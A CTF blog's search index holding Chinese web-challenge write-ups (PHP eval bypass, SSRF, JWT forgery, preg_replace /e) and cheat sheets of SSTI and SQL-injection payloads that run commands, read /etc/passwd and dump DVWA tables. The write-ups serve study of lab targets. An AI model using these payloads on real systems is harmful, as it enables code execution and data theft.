[{"categories":["CTF"],"content":"[RoarCTF 2019]Easy Calc 考点：命令执行 查看网页源码后发现存在calc.php页面，且提示存在waf $('#calc').submit(function(){ $.ajax({ url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()), type:'GET', success:function(data){ $(\"#result\").html(`\u003cdiv class=\"alert alert-success\"\u003e \u003cstrong\u003e答案:\u003c/strong\u003e${data} \u003c/div\u003e`); }, error:function(){ alert(\"这啥?算不来!\"); } }) return false; }) 访问calc.php： \u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); } ?\u003e waf绕过： 直接传入num会报错，应该是被waf过滤了，这里可以使用空格绕过waf，原理为：PHP代码处理输入参数时会将参数前后多余的空白符（空格、回车、制表符）删除，因此传入?%20num后能够绕过waf，PHP在解析时又会将?%20num当作?num。 命令执行： 查看phpinfo，发现过滤了很多执行函数，但没有过滤var_dump、scandir、file_get_contents，构造参数?%20num=var_dump(scandir(chr(47)))，因为\"\\“被过滤了，使用chr(47)替代”\\\"，查看根目录信息 发现f1agg，构造参数?%20num=var_dump(file_get_contents(chr(47).f1agg))即可获取flag。flag{9f0a644e-780d-47ff-b1b3-87f2568f3fc0} 其它方法： 参考链接：https://blog.csdn.net/m0_73612768/article/details/135013881，发现还有一种命令执行的方法，构造payload? num=1;eval(end(pos(get_defined_vars())))\u0026nss=phpinfo();， **get_defined_vars()：**返回由所有已定义变量所组成的数组，会返回 GET , POST , COOKIE, FILES 全局变量的值，返回数组顺序为 get-\u003epost-\u003ecookie-\u003efiles 。 **pos()：**返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。 **end()：**将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。最后由 eval() 函数执行，使得 get 方式的参数 nss 生效。这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。 构造payload：? num=1;eval(end(pos(get_defined_vars())))\u0026nss=include(\"/f1agg\");即可获得flag。 ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:1:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"[ACTF2020 新生赛]BackupFile 扫网站备份文件，存在index.php.bak文件，打开后进行php代码审计 \u003c?php include_once \"flag.php\"; if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(\"Just num!\"); } $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) { echo $flag; } } else { echo \"Try to find out source file!\"; } 考点：php弱类型比较。在php中= =为弱比较，当整数类型和字符串类型比较时，字符串先被转换成整数类型后再与整数类型进行比较。由于$str=““123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"\"，只需要传入123即可令$key == $str。 ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:2:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"[BJDCTF2020]Easy MD5 burp抓包发送后发现hint: select * from ‘admin’ where password=md5($pass,true)。md5($pass,true)的作用是返回原始二进制数的md5值。这里可以使用ffifdyop绕过，原理为：ffifdyop被md5加密后变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ’ or '6，相当于万能密码，因此可以绕过md5()函数。 传入ffifdyop后进入levels91.php，发包后返回信息中有一条： \u003c!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b \u0026\u0026 md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --\u003e 典型的md5弱比较绕过，传入两个不相等但是哈希后值相等的字符串即可 # 这些字符串的md5值都是0e开头，在php弱类型比较中判断为相等 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 进入下一关：levell14.php \u003c?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag; } md5强比较，用param1[]=1\u0026param2[]=2即可绕过。flag{17b7a715-330f-4e08-9da2-702ca8d50c83} ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:3:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"[网鼎杯 2018]Fakebook 考点：ssrf、sql注入 进入环境需要注册，注册并登录后发现点击用户名后可以查看该用户的博客信息，在/view.php?no=中传入不同的值可以查看不同的用户，猜测存在sql注入。构造语句1 and 1=1 –+和1 and 1=2 –+，分别传入后发现后者报错，说明存在数字型注入 构造order by语句发现存在4个字段 构造1 union select 1,2,3,4 –+传入后回显no hack，存在过滤。使用内联注入可绕过，1 union/**/select 1,2,3,4 –+ 后面就是查表、列、字段信息，发现没有和flag相关的信息，但是存在一条php序列化后的数据： 在robots.txt中发现还有备份文件：user.php.bak，下载后进行代码审计 \u003c?php class UserInfo { public $name ; public $age=0; public $blog; public function __construct($name, $age, $blog) { $this-\u003ename = $name; $this-\u003eage = (int)$age; $this-\u003eblog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } public function isValidBlog () { $blog = $this-\u003eblog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } 下面的内容是核心部分，这段代码会导致ssrf漏洞，用户可控制的blog的值，且curl_setopt($ch, CURLOPT_URL, $url) 直接使用用户输入的 URL，没有任何防护，用户可通过get方法用curl发起请求。 public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } 构造序列化数据通过sql注入传参即可获得base64加密后的flag $a = new UserInfo(\"admin\",19,\"file:///var/www/html/flag.php\"); echo serialize($a); /view.php?no=-1/**/union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:19;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' from fakebook.users# $flag = “flag{d86979c3-8339-437c-a678-c7f815536604}”; ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:4:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"[RootersCTF2019]ImgXweb 考点：jwt伪造 注册账号登录后可以看到存在加密后的cookie，解密后将user改成admin，还需要一个密钥。 在robots.txt中找到一个路径：/static/secretkey.txt，访问后得到密钥you-will-never-guess，jwt加密后将原本的cookie替换成自己修改后的cookie：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE 刷新后即可看到已经以admin身份登录，并且存在三个png图像，其中一个还是flag.png 直接访问图像路径会显示图像存在错误而无法访问，用burp访问后即可得到flag flag{1b4973b0-b93b-4cb6-88a3-d7e8db30e0b0} ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:5:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"[BJDCTF2020]ZJCTF，不过如此 考点：文件包含、命令执行 代码审计： \u003c?php error_reporting(0); $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; if(isset($text)\u0026\u0026(file_get_contents($text,'r')===\"I have a dream\")){ echo \"\u003cbr\u003e\u003ch1\u003e\".file_get_contents($text,'r').\"\u003c/h1\u003e\u003c/br\u003e\"; if(preg_match(\"/flag/\",$file)){ die(\"Not now!\"); } include($file); //next.php } else{ highlight_file(__FILE__); } ?\u003e 提示了需要包含next.php，这里使用php伪协议读取文件，同时利用php://input执行post数据中的php代码 ?text=php://input\u0026file=php://filter/read=convert.base64-encode/resource=next.php 同时post字符串I have a dream 即可获得base64加密后的数据，解密后得 \u003c?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =\u003e $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); } 分析一下，complex函数需要参数$re、$str，并且两个参数都可控，这个函数的作用时如果str中匹配到了满足/(’ . $re . ‘)/ei的字符串就执行strtolower(”\\1”)，并且由于存在e参数，php会执行第二个参数，即eval(strtolower(\"\\1\"))。getFlag函数中存在eval函数，通过传递cmd执行命令，但@eval()默认不会被调用，需要通过其它的方式触发。 查询资料得知\\1设计一个叫做反向引用的知识点： # 对一个正则表达式模式或部分模式两边添加圆括号,将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。所以这里的 \\1 实际上指定的是第一个子匹配项 如果我们构造payload：?.*={${phpinfo()}}，php处理的语句就会变成preg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', ${phpinfo()});单看这条语句，/(.*)/ei会匹配${phpinfo()}的全部内容，并在strtolower中反向引用，变成strtolower(${phpinfo()})，由于正则表达式中存在e参数，phpinfo()将被当做php代码执行。但本题中该payload没有执行，原因是在PHP中，对于传入的非法的$_GET数组参数名，会将其转化为下划线，导致了正则匹配失效。因此需要将.替换成\\S。 构造payload：?\\S*=${getFlag()}\u0026cmd=passthru(“ls /\")，发现存在flag，利用cat /flag读取就能获得flag。 flag{ebc21d3d-fc88-4db7-b2bc-8d81e0863930} ","date":"2025-04-22","objectID":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:6:0","tags":["web","刷题"],"title":"BUUCTF——WEB刷题记录","uri":"/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["CTF"],"content":"SSTI 漏洞成因 ssti 服务端模板注入成因为：web 应用在使用框架（如 python 的 flask、jinjia2、django；java 的 freemarker、velocity；php 的 thinkphp、smarty 等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:1:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"SSTI 中常用魔术方法 __class__ 返回一个实例所属的类 __mro__ 查看类继承的所有父类，直到 object __subclasses__() 获取一个类的子类，返回的是一个列表 __bases__ 以元组形式返回一个类直接继承的类 __init__ 类实例创建之后调用，对当前对象的实例的初始化 __globals__ 使用方式为函数名.__globals__，返回一个当前空间下能使用的模块、方法和变量的字典 __getattribute__ 当类被调用时，无条件进入此函数 __getattr__ 访问对象中不存在的属性时调用 __dict__ 返回所有属性，包括属性、方法等 __builtins__ 查看当前所有导入的内建函数 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:2:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"攻击思路 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:3:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"获取基本类 dict //返回类中的函数和属性，父类子类互不影响 base //返回类的父类 python3 mro //返回类继承的元组，(寻找父类) python3 init //返回类的初始化方法 subclasses() //返回类中仍然可用的引用 python3 globals //对包含函数全局变量的字典的引用 python3 对于返回的是类实例的话: class //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法 ''.__class__.__mro__[-1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:4:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"获取基本类后，继续获取基本类的子类 object.subclasses() ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:5:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"找__init__类 ''.__class__.__mro__[2].__subclasses__()[99].__init__ ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:6:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"查看其引用__builtins__ ''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__'] ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:7:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能 ''.__class__.__mro[2].subclasses()[138].init.globals['builtins']['file']('/etc/passwd').read() ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:8:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"常用目标函数 file、subprocess.Popen、os.popen、exec、eval ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:9:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"绕过过滤方法 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:10:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤中括号 魔术方法__getitem__可替代中括号 # 当中括号被过滤时，如下将被限制访问: {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}} # 可用__getitem__替换中括号[]: {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:11:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤下划线 # 原 payload 被限制: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} # 1.使用 attr()绕过，payload: {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }} 同时 get 方法传参?a=__class__\u0026b=__base__\u0026c=__subclasses__\u0026d=__init__\u0026e=__globals__ # 2.将下划线进行编码绕过，payload: {{ ().['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[xx]['\\x5f\\x5finit\\x5f\\x5f'].['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat /flag') }} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:12:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤点 # 原 payload 被限制: {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} # 1.使用 attr()绕过，payload: {{ () | attr('__class__') | attr('__base__') | attr('__subclasses__')() | attr('__getitem__')(xx) | attr('__init__') | attr('__globals__') | attr('__getitem__')('popen')('cat /flag') | attr('read')()}} # 2. 使用中括号绕过，payload: {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:13:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤大括号 使用{%%}替代{{}}，payload: {% print(’’.class.base.subclasses()[xx].init.globals[‘popen’](‘cat /flag’).read()) %} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:14:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤引号 # 当'被过滤后以下访问将被限制 {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} # 1.通过request.args的get传参输入引号内的内容，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[request.args.popen](request.args.cmd).read() }} 同时get传参?popen=popen\u0026cmd=cat /flag # 2.通过request.form的post传参输入引号内的内容，payload： {{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read() }} 同时post传参?popen=popen\u0026cmd=cat /flag # 3.使用cookies传参，如request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:15:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤数字 使用过滤器 length 绕过 {% set a=‘aaa’ | lenth %}{{ ().class.base.subclasses()[a]}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:16:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤函数名 # 1.使用拼接绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }} # 2.使用16进制编码绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\\x70\\x6f\\x70\\x65\\x6e']('cat /flag').read() }} # 3.使用base64编码绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:17:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"SQL 注入常用函数 联合注入函数: concat() concat_ws() group_concat() 布尔盲注函数: length() left() right() substr() mid() ascii() ord() 时间盲注函数: sleep() if() 报错注入函数: floor() exp() updatexml() extractvalue() ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:1:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(一)注入类型 SQL 注入通常分为两种类型：数字型和字符型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:2:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(1)注入类型为数字型时，SQL 查询语句通常为： select * from users where id = x 判断方法： 1. ?id = 1 and 1 = 1 --+ 若无报错，继续下一步 2. ?id = 1 and 1 = 2 --+ 若报错， 则注入类型为数字型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:3:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(2)注入类型为字符型时，SQL 查询语句通常为： select * from users where id = '1' 判断方法： 1. ?id = 1' and '1' = '1 --+ 若无报错，继续下一步 2. ?id = 1' and '1' = '2 --+ 若报错， 则注入类型为字符型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:4:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(二)报错注入 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:5:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"一、SQL 报错注入常用函数： updatexml（）、extractvalue（）、floor（） (1) updatexml（）函数 updatexml（）使用不同的 xml 标记匹配和替换 xml 块，用于改变文档中符合条件的节点的值 基本语法：UPDATEXML(xml_target, xpath_expr, new_val)，xml_target是要修改的 XML 类型的数据，xpath_expr是一个 XPath 表达式，用于指定要修改的节点位置，new_val是一个新的节点值，用于替换当前节点的值 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax） 例如：select * from users where id = 1 and (updatexml(1,0x7e,3));0x7e 是字符~，不属于 xpath 语法格式，因此会出现 xpath 语法错误 (2) extractvalue（）函数 extractvalue（）用于从 XML 文档中提取信息 基本语法：ExtractValue(XML_fragment, XPath_string)，其中XML_fragment是 XML 格式的字符串，XPath_string是用于定位 XML 文段中特定数据的 XPath 表达式 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax） 例如：select * from users where id = 1 and (extractvalue(1,0x7e)); (3) floor（）函数 floor（）利用select count(*),(floor(rand(0)*2)) as x from 表名 group by x;导致数据库报错，通过 concat 函数连接注入语句与 floor(rand(0)*2)函数，实现将注入结果与报错信息回显 count(*) 是一个聚合函数，用来计算表中所有行的数量，floor(rand(0)*2)产生的固定序列为：01101，结合 group by 会产生一个虚拟表。 原理：rand 伪随机函数与order by或group by函数的冲突，例如 floor(rand(0)*2)一开始计算得到了 0，group by 根据 0 分类统计，在写入要返回的虚表时 floor(rand(0)*2)还要计算一次结果，这次结果却是 1，导致了冲突。 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:6:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"二、updatexml 函数实战（基于 dvwa 靶场） 1.爆数据库和用户名：1' and updatexml(1,concat(0x7e,database(),0x7e,user()),1)# 输出结果： 2.爆当前数据库的表信息：1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)# 输出结果： 3.爆 dvwa 数据库中的 user 表的字段信息：1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'),0x7e),1)# 输出结果： 4.爆数据库内容：1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e),1)# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:7:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"三、extractvalue 函数实战（基于 dvwa 靶场） 1.爆数据库和用户名：1' and extractvalue(1,concat(0x7e,database(),0x7e,user()))# 输出结果： 2.爆当前数据库的表信息：1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))# 输出结果： 3.爆 dvwa 数据库中的 user 表的字段信息：1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')))# 输出结果： 4.爆数据库内容：1' and extractvalue(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e))# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:8:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"四、floor 函数实战 (基于 dvwa 靶场) 1.判断是否存在报错注入：1' union select count(*),floor(rand(0)*2) x from information_schema.tables group by x# 输出结果： 确认存在报错注入 2.爆当前数据库名：1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x # 输出结果： 可以看到数据库名为 dvwa，1 是随机数 3.爆当前数据库表信息：1' union select count(*),concat(floor(0)*2,0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)) x from information_schema.schemata group by x# 输出结果： 4.爆数据库表中字段信息：1' union select count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)) x from information_schema.schemata group by x# 输出结果： 5.爆数据库内容：1' union select count(*),concat(floor(rand(0)*2),(select group_concat(first_name,last_name) from dvwa.users)) x from information_schema.schemata group by x# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:9:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"}]